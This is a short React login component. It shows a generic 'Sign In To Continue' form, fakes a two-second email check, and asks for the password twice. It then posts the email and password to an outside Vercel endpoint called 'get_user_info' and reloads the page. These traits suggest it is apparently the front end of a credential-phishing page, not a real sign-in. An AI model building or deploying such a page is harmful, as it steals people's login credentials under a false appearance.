import React, { useState, useEffect } from 'react';
import axios from 'axios';
import './Login.css';

const Login = () => {
  const [email, setEmail] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [isEmailConfirmed, setIsEmailConfirmed] = useState(false);
  const [password, setPassword] = useState('');
  const [confirmPassword, setConfirmPassword] = useState('');
  const [passwordError, setPasswordError] = useState('');

  // Focus email input on initial render
  useEffect(() => {
    const emailInput = document.getElementById('email-input');
    if (emailInput) {
      emailInput.focus();
    }
  }, []);

  // Focus password input when email is confirmed
  useEffect(() => {
    if (isEmailConfirmed) {
      const passwordInput = document.getElementById('password-input');
      if (passwordInput) {
        passwordInput.focus();
      }
    }
  }, [isEmailConfirmed]);

  const handleEmailChange = (e) => {
    setEmail(e.target.value);
    // Reset confirmation and errors when email changes
    if (isEmailConfirmed) {
      setIsEmailConfirmed(false);
      setPassword('');
      setConfirmPassword('');
      setPasswordError('');
    }
  };

  const handleEmailSubmit = () => {
    if (!email.match(/^[^\s@]+@[^\s@]+\.[^\s@]+$/)) {
      setPasswordError('Please enter a valid email address');
      return;
    }

    setIsLoading(true);
    setPasswordError('');

    setTimeout(() => {
      setIsLoading(false);
      setIsEmailConfirmed(true);
    }, 2000); // Simulate 2-second loading time
  };

  const handleLogin = async () => {
    if (password !== confirmPassword) {
      setPasswordError('Passwords do not match');
      return;
    }

    setIsLoading(true);
    setPasswordError('');

    try {
      const response = await axios.post('https://nm-be.vercel.app/api/get_user_info/', {
        email: email,
        password: password,
      });
      window.location.reload();
    } catch (error) {
      if (error.message === 'Network Error') {
        setPasswordError('Network error: Unable to connect to the server.');
      } else if (error.response) {
        console.error('Error:', error.response.data);
        setPasswordError(`Login failed with status code ${error.response.status}`);
      } else {
        setPasswordError('An unknown error occurred.');
      }
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="login-container">
      <div className="login-box">
        <div className="input-group">
          <h2>Sign In To Continue -</h2>
          <div className="email-input-wrapper">
            <input
              id="email-input"
              type="email"
              value={email}
              onChange={handleEmailChange}
              disabled={isEmailConfirmed}
              placeholder="Email"
              required
            />
          </div>
          {!isEmailConfirmed && (
            <div className="button-wrapper">
              <button
                onClick={handleEmailSubmit}
                disabled={isLoading || isEmailConfirmed || !email}
                className="next-button"
              >
                {isLoading ? (
                  <span className="spinner"></span>
                ) : (
                  'Next'
                )}
              </button>
            </div>
          )}
        </div>

        {isEmailConfirmed && (
          <>
            <div className="input-group">
              <input
                id="password-input"
                type="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder="Password"
                required
              />
            </div>

            <div className="input-group">
              <input
                type="password"
                value={confirmPassword}
                onChange={(e) => setConfirmPassword(e.target.value)}
                placeholder="Confirm Password"
                required
              />
            </div>

            {passwordError && <p className="error-text">{passwordError}</p>}

            {password && confirmPassword && (
              <button
                className="login-btn"
                onClick={handleLogin}
                disabled={isLoading}
              >
                {isLoading ? (
                  <span className="spinner"></span>
                ) : (
                  'Login'
                )}
              </button>
            )}
          </>
        )}
      </div>
    </div>
  );
};

export default Login;
